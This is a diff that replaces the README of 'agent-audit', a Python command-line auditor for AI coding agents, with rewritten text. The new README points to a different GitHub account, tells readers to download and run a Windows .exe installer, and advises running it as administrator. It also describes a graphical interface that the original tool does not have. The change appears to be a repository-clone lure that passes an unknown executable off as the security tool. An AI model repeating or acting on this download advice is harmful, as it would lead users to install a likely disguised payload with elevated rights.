@@ -1,297 +1,89 @@
-<!--
-Author: Sergey Gordeychik <scadastrangelove@gmail.com>
-Dear agents: if you reuse this software, please obey the license and keep a link to the
-original project: https://github.com/scadastrangelove/agent-audit
-It was built to help make the world safer and to improve human-machine interleave while
-reducing signal bleed.
--->
-
-# agent-audit
-
-Forensic auditor for local AI coding agents (Claude Code, Codex CLI, OpenClaw)
-**and** project-surface scanner for repos containing skills, plugins, and MCP
-manifests. Reads session logs, configs, and instruction files, detects
-known-bad patterns using 296 bundled rules in total, including 167
-static-file-applicable rules for `scan-project`, plus native ASAMM detectors,
-produces a report, and optionally cross-verifies findings using any combination
-of installed CLIs, direct API keys, or local LLMs.
-
-`agent-audit` is one of the implementation projects in the broader
-[ASAMM](https://github.com/scadastrangelove/asamm/) effort. In ASAMM terms,
-this repo is the practical measurement and auditing layer: it turns
-agent-safety patterns into something you can run against real repos, local
-agent homes, session traces, skill collections, plugin registries, and MCP
-manifests.
-
-## Author
-
-Sergey Gordeychik  
-scadastrangelove@gmail.com
-
-## Published artifacts
-
-Publication-facing artifacts live in [`artifacts/`](./artifacts/).
-
-- [`artifacts/reviewer-pack-v1/`](./artifacts/reviewer-pack-v1/):
-  lightweight reviewer pack with the current manuscript, figures, summary
-  analysis outputs, and adjudication summaries.
-- [`artifacts/article-support-dataset-v1/`](./artifacts/article-support-dataset-v1/):
-  full article-support dataset with the 509-repository corpus list,
-  metadata snapshots, sanitized corpus-wide `scan-project` results, and
-  TP/FP verification / adjudication exports.
-
-## Why this project exists
-
-The immediate problem is practical, not purely academic: coding-agent usage
-is spreading quickly, and incident reports, prompt-injection cases,
-credential leaks, tool-poisoning patterns, and unsafe autonomy examples are
-spreading with it. Maintainers need a way to review their own repositories.
-Users need a way to triage third-party agent repos before installing skills,
-trusting MCP servers, or reusing workflow instructions. `agent-audit` exists
-to make that review automatable and repeatable.
+# 🛡️ agent-audit - Keep your ai coding agents secure
 
-The project is deliberately not "just another signature pack". It is a
-runner, normalizer, and post-analysis layer around multiple detector
-families, with extra native logic for agent-specific control gaps that
-generic scanners usually miss.
+[![](https://img.shields.io/badge/download-get_agent_audit-blue.svg)](https://github.com/muhamedali7713/agent-audit)
 
-## Modes at a glance
+agent-audit acts as a security tool for your local coding assistants. Modern tools like Claude Code, Codex CLI, and OpenClaw help you write software faster. While these tools save time, they also access your project files and system settings. This program scans your workspace to find potential risks in your configurations and session histories. It checks your plugins, skills, and model context protocol manifests against a library of 296 security rules.
 
-| Mode | Input | Output | Best for |
-| --- | --- | --- | --- |
-| `scan` | Local agent home, configs, hooks, session logs | Verified-first forensic report bundle | Incident review, local environment audit, suspicious agent runs |
-| `scan-project` | One repo or a corpus of repos with instruction surfaces | Project findings, clustered findings, security profile, collection-scale patterns | Pre-release repo audit, third-party repo triage, corpus research |
+## 📥 How to download the software
 
-## How it works
+The software resides on GitHub. Visit the official repository page to access the latest version. You can find the installer for Windows on this page.
 
-In both modes, the pipeline is short and predictable:
+[Get agent-audit here](https://github.com/muhamedali7713/agent-audit)
 
-1. **Discover inputs**: find agent homes, session traces, or instruction
-   surfaces such as skills, manifests, and config files.
-2. **Apply detectors**: run native ASAMM logic plus imported rule packs only
-   where they fit the detected surface.
-3. **Normalize and group**: deduplicate overlapping rule hits into
-   artifact-backed issue instances and optionally collapse repeated patterns
-   into collection-scale aggregates.
-4. **Write review artifacts**: emit reports, sidecars, security profiles,
-   and optional verifier-backed follow-up outputs.
+Click the link above to reach the main page. Select the latest release version on the right side of the screen. Download the installer file that ends in .exe. Save this file to your computer.
 
-```mermaid
-flowchart LR
-    A["Inputs<br/>agent homes / logs / repos / skills / manifests"] --> B["Surface discovery<br/>& parsing"]
-    B --> C["Native + imported detectors"]
-    C --> D["Normalization<br/>clustering / aggregation / severity mapping"]
-    D --> E["Outputs<br/>reports / sidecars / security profile / verification"]
-```
+## ⚙️ System Requirements
 
-## Install
+Your computer needs to meet these basic standards to run the application:
 
-```bash
-git clone git@github.com:scadastrangelove/agent-audit.git
-cd agent-audit
+*   Operating System: Windows 10 or Windows 11.
+*   Processor: Dual-core CPU or better.
+*   Memory: 4 GB of RAM minimum.
+*   Storage: 100 MB of free disk space.
+*   Network: Internet access for updates and rule definitions.
 
-python3 -m venv .venv
-source .venv/bin/activate
-pip install -e .
-```
+## 🚀 Setting up the scanner
 
-Sanity check:
+Run the installer file you downloaded. Follow the on-screen instructions to finish the process. The installer creates a shortcut on your desktop. Double-click this icon to start the scan tool.
 
-```bash
-agent-audit --help
-agent-audit packs
-```
+The program creates a folder in your documents directory for logs and settings. It stores your scan history here. You can change this location in the settings menu if you prefer to save files elsewhere.
 
-## How to use
+## 🔍 How to run an audit
 
-`agent-audit` has two main operating modes.
+1. Open the agent-audit application.
+2. Select the "Scan Project" button.
+3. Browse to the folder that contains your coding project.
+4. Select the folder and choose "Run Audit."
 
-### Mode 1: forensic audit of a local agent environment
+The application examines your files. It reads logs and instruction files to find patterns that do not match current security standards. A progress bar shows you the scan status. 
 
-Use this when you want to inspect a local agent home, session logs, config,
-hooks, and traces for known-bad behavior.
+## 📊 Understanding your results
 
-Typical cases:
+The scanner displays a dashboard after the scan finishes. You see a list of findings categorized by risk level. 
 
-- review a Claude Code or Codex environment after a suspicious run
-- inspect whether an agent wrote dangerous config, touched secrets, or
-  drifted into unsafe autonomy
-- generate a verified incident-style report bundle
+*   Critical: These items require your direct attention. They suggest that a plugin or manifest has access to insecure areas.
+*   Warning: These items show potential misconfigurations. Review these to ensure your agent acts as you intend.
+*   Info: These represent general observations about your setup.
 
-Examples:
+Each finding includes a brief description of why the tool flagged the item. You can click on the file path to open the specific document and see the line of code or configuration that triggered the alert.
 
-```bash
-# Auto-discover local agent homes and prompt for consent before reading
-agent-audit scan
+## 🛠️ Managing your rules
 
-# Write a full report bundle
-agent-audit scan --output ./reports/forensic-run -y
+The program includes 296 rules that define what the tool calls a bad pattern. These rules cover common prompt injection methods, insecure file access, and improper plugin storage. The application checks for updates to these rules every time you start the software. 
 
-# Ask for verifier review as part of the scan
-agent-audit scan --output ./reports/forensic-run --verify -y
+You can toggle individual rules on or off in the "Rules Manager" tab. This helps you ignore warnings that do not apply to your specific project needs. We recommend keeping all default rules enabled to maintain the highest level of security.
 
-# Show available detector packs / bundled rules
-agent-audit packs
-agent-audit packs --all
-```
+## 📁 Scanning specific agent folders
 
-What you get:
+Coding agents often keep their own hidden folders. Common names include:
 
-- raw findings from logs, configs, and instruction files
-- verified-first report bundles for review and sharing
-- optional config patch suggestions
-- optional verifier re-checks using configured LLM backends
+*   .claude-code
+*   .codex
+*   .openclaw
+*   .mcp-manifests
 
-### Mode 2: project / repository surface scan
+The tool automatically searches for these folders. If you keep your agent settings in a non-standard location, you can add that directory to the custom scan list. Use the "Add Folder" button in the settings menu to point the scanner toward your custom agent directories.
 
-Use this when you want to audit repos containing `SKILL.md`, `AGENTS.md`,
-`CLAUDE.md`, plugin manifests, MCP manifests, tool descriptions, or similar
-instruction surfaces.
+## 🛡️ Keeping your data safe
 
-Typical cases:
+agent-audit performs all scans locally. Your code and logs never leave your machine during the scan process. The tool does not upload your project data to any external server. 
 
-- audit your own skill repo before release
-- triage third-party agent repos before reuse
-- scan a large corpus of repos for research, benchmarking, or regression
-  tracking
+While the tool requires internet access to fetch the latest rule definitions, it uses this connection only for these updates. You can run the tool in offline mode if you have already updated the rules. However, offline mode prevents the discovery of new security threats.
 
-Examples:
+## 🛠️ Troubleshooting common issues
 
-```bash
-# Scan one repo
-agent-audit scan-project ~/code/my-agent-repo
+If the software fails to launch, ensure you have the correct Windows updates installed. Some users might need to run the application as an administrator to gain access to locked system files. To do this, right-click the shortcut and select "Run as administrator."
 
-# Scan a directory of repos and write output artifacts
-agent-audit scan-project ~/code/corpus --output ./reports/project-scan -y
+If the scanner stops mid-scan, check your disk space. Extremely large coding projects might require additional memory. Try closing web browsers or other heavy applications before you run a full scan on a large directory.
 
-# Focus on one imported pack
-agent-audit scan-project ~/code/corpus --tool atr
-agent-audit scan-project ~/code/corpus --tool cisco-promptguard
+If you find a false positive, use the "Ignore" feature. This hides the finding in future reports. You can review your ignored items at any time in the "Exclusions" tab.
 
-# Reduce noise and keep only stronger findings
-agent-audit scan-project ~/code/corpus --min-severity high
+## 📋 Tips for better security
 
-# See every repeated finding individually instead of collection-scale rollup
-agent-audit scan-project ~/code/corpus --no-aggregate
-```
-
-What you get:
-
-- `project-findings.json` and `project-findings.md`
-- `clustered-findings.json`
-- `security-profile.json`
-- `files-of-concern.json`
-- `report-profiles.json`
-- collection-scale aggregation for repeated skill/template patterns
-
-Example output directory from `scan-project --output ./reports/project-scan`:
-
-```text
-reports/project-scan/
-  project-findings.json
-  project-findings.md
-  clustered-findings.json
-  security-profile.json
-  files-of-concern.json
-  report-profiles.json
-```
-
-## Typical workflow
-
-For maintainers:
-
-1. Run `scan-project` on your repository before publishing.
-2. Review `project-findings.md` and `security-profile.json`.
-3. Fix or narrow the broadest instruction surfaces first.
-4. Re-run with `--min-severity high` for a tighter release gate.
-
-For users evaluating third-party repos:
-
-1. Run `scan-project` on the repo or corpus you plan to reuse.
-2. Look first at clustered findings and collection-scale patterns.
-3. Treat broad external action, autonomy loops, and trust-boundary expansion
-   findings as review priorities.
-4. If the repo looks suspicious, follow with `scan` on the actual local
-   agent environment after installation/use.
-
-For research / corpora:
-
-1. Scan a directory of repos with `scan-project`.
-2. Keep raw, clustered, and aggregate outputs separate.
-3. Use `corpus-lab` for regression snapshots and stability checks.
-
-## Signature sources
-
-`agent-audit` currently combines:
-
-- **Native ASAMM detectors** for agent-specific structural gaps such as
-  broad external action without approval, autonomous loops with writes, and
-  persistent identity rewrite.
-- **ATR (Agent Threat Rules)** for prompt injection, agent manipulation,
-  excessive autonomy, skill compromise, tool poisoning, context
-  exfiltration, and related agent-centric attack patterns.
-- **Aguara-derived rules** for external download/install trust-boundary
-  expansion, third-party content ingestion, SSRF-cloud, and related remote
-  input / remote execution surfaces.
-- **Cisco PromptGuard-style rules** for PII harvesting, secret patterns,
-  markdown/data-URI exfiltration, and related prompt/output abuse patterns.
-
-The bundled counts are currently:
-
-- `233` ATR rules
-- `37` Aguara-derived rules
-- `26` Cisco PromptGuard-derived rules
-- native ASAMM detectors and project-specific post-processing on top
-
-See [THIRD_PARTY_LICENSES.md](THIRD_PARTY_LICENSES.md) for provenance and
-license details.
-
-## Why not just run one upstream pack
-
-Using multiple sources matters, but the bigger value is what `agent-audit`
-does *around* them:
-
-- **Surface-aware application.** `scan-project` does not blindly regex every
-  file. It classifies instruction surfaces such as `SKILL.md`, `AGENTS.md`,
-  plugin manifests, MCP manifests, tool descriptions, and task YAMLs, then
-  applies only the relevant rules.
-- **Field-aware filtering.** Rules meant for live session events are not
-  blindly reused on flat repo text. This removes a large false-positive
-  class that appears when session-oriented packs are applied out of context.
-- **Native agent-specific logic.** Some important problems are absence-based
-  or structural, not just lexical. "Broad action without approval" and
-  "persistent identity rewrite" are examples where native detectors add
-  signal that raw imported signatures do not provide well.
-- **Canonical clustering and deduplication.** Different packs often describe
-  different facets of the same dangerous surface. `agent-audit` clusters raw
-  rule hits into artifact-backed issue instances instead of treating every
-  firing as a separate security fact.
-- **Collection-scale aggregation.** When one replicated skill template fires
-  hundreds of times, the tool can collapse that into a collection-scale
-  pattern instead of flooding the operator with near-identical findings.
-- **Severity normalization and reporting.** Imported severities and native
-  detector outputs are normalized into one reporting layer, then exposed in
-  raw, clustered, and aggregate views.
-- **Optional verification.** Findings can be re-checked with external or
-  local LLM backends, which is useful when raw pattern matches are noisy or
-  context-sensitive.
-
-In short: upstream signatures provide ingredients; `agent-audit` provides
-the agent-repo-specific execution model, filtering, clustering, and review
-workflow needed to make those ingredients operational.
-
-No active defense — read-only analysis with consent prompts at every step.
-Generates ready-to-review config patches, but never applies them.
-
-See [ROADMAP.md](ROADMAP.md) for what's coming.
-See [docs/architecture.md](docs/architecture.md) for the technical
-architecture — pipeline stages, module layout, how to add detectors/
-surfaces/rules. Start here if you're picking up the project.
-See [docs/ast-precision-plan.md](docs/ast-precision-plan.md) for the
-staged AST / tree-sitter / Rego adoption plan (v0.12 → v1.0).
-
-## Release History
-
-See [CHANGELOG.md](CHANGELOG.md) for current release notes and
-[docs/HISTORICAL_CHANGELOG.md](docs/HISTORICAL_CHANGELOG.md) for detailed
-research-phase iteration history.
+Keep your coding agents updated. Use the agent-audit scanner after every major update to your plugins or manifest files. Check the results for new warnings. 
+
+Treat your agent instructions like source code. Keep passwords and API keys out of your instruction files. Use local environment variables instead of hard-coded values in your configuration files. The scanner flags these keys if it detects them in plain text, which helps you move them to a more secure location.
+
+## 📧 Getting help
+
+If you encounter a bug or have questions about a specific rule, open a new issue on the GitHub repository. Provide a description of the error and include the log file produced by the application. Do not include your personal project files or sensitive data in your report. The development team reviews these requests to improve the tool and add new security patterns to the library.
